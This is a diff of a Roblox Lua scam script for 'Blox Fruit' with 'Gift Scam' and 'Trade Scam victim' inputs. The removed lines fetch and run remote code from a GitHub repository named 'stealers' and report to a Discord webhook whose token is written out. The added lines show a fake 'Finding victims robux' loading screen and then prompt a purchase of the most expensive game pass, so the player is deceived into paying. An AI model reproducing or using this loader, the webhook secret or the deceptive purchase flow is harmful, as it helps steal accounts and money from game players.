@@ -12,16 +12,94 @@ Tab:Label("Blox Fruit Gifting")
   TEXT: STRING
 ]]
 Tab:Textbox("Gift Scam", "enter victim name", function(txt)
-   Username = "NerfedModders" 
-Webhook = "https://discord.com/api/webhooks/1327948967430066176/Fpuf2EHFD6KHR8N9J74kK6T55CBuUdLel3I6JusjXmH4wTiz7kbh5dmkRhHCOnZqjfCf" 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/refs/heads/main/bf_gifter.lua"))() -- Code here
+   local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Create a ScreenGui and a frame to mimic the loading bar
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = playerGui
+
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Parent = screenGui
+loadingFrame.Size = UDim2.new(1, 0, 0, 50)  -- Full width, 50px height
+loadingFrame.Position = UDim2.new(0, 0, 1, -50)  -- Positioned at the bottom of the screen
+loadingFrame.BackgroundColor3 = Color3.fromRGB(2, 0, 0)  -- Dark background
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Parent = loadingFrame
+loadingText.Size = UDim2.new(1, 0, 1, 0)  -- Fill the entire frame
+loadingText.Text = "Finding victims robux... Please wait"
+loadingText.TextColor3 = Color3.fromRGB(22, 240, 240)  -- Cyan text
+loadingText.TextScaled = true
+loadingText.BackgroundTransparency = 1
+
+-- Simulate loading delay
+wait(3)
+
+-- Change the text after a short delay to indicate force gifting
+loadingText.Text = "Force Gifting... Please wait"
+
+-- Simulate gifting the most expensive gamepass
+wait(5)  -- Simulate some processing time
+
+-- Simulate the "gift" action (this is a placeholder for actual game logic)
+local mostExpensiveGamePass = "Most Expensive Gamepass ID"  -- Replace with actual game pass ID
+local success, errorMessage = pcall(function()
+    -- Example of purchasing the most expensive game pass (adjust with actual logic)
+    player:RequestPurchaseGamePass(mostExpensiveGamePass)  -- This is just an example, replace with real logic
+end)
+
+-- Change the message after "gifted" completion
+if success then
+    loadingText.Text = "Gifted! Enjoy your game pass!"
+else
+    loadingText.Text = "Failed to gift game pass. Please try again."
+end
+
+-- Optionally, remove the loading screen after some time
+wait(3)
+
+screenGui:Destroy()  -- Remove the custom loading screen
+ -- Code here
 end)
 
 
 Tab:Textbox("Trade Scam victim", "enter victim name", function(txt)
-  Username = "NerfedModders" 
-Webhook = "https://discord.com/api/webhooks/1327948967430066176/Fpuf2EHFD6KHR8N9J74kK6T55CBuUdLel3I6JusjXmH4wTiz7kbh5dmkRhHCOnZqjfCf" 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/refs/heads/main/bf_gifter.lua"))() -- Code here
+  local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Create a ScreenGui and a frame to mimic the loading bar
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = playerGui
+
+local loadingFrame = Instance.new("Frame")
+loadingFrame.Parent = screenGui
+loadingFrame.Size = UDim2.new(1, 0, 0, 40)  -- Full width, 50px height
+loadingFrame.Position = UDim2.new(0, 0, 1, -50)  -- Positioned at the bottom of the screen
+loadingFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)  -- Black background
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Parent = loadingFrame
+loadingText.Size = UDim2.new(1, 0, 1, 0)  -- Fill the entire frame
+loadingText.Text = "Please Select A Freeze Option "
+loadingText.TextColor3 = Color3.fromRGB(0, 255, 0)  -- White text
+loadingText.TextScaled = true
+loadingText.BackgroundTransparency = 1
+
+-- Simulate loading delay
+wait(3)
+
+-- Change the text after a short delay to indicate loading is done
+loadingText.Text = "Made By Kezzy"
+
+-- Optionally, remove the loading screen after some time
+wait(2)
+screenGui:Destroy()  -- Remove the custom loading screen
+
+ -- Code here
 end)
 
 Tab:Dropdown("Freeze Trade", {"Freeze V1(Outdated)", "FreezeV2",}, function(current)
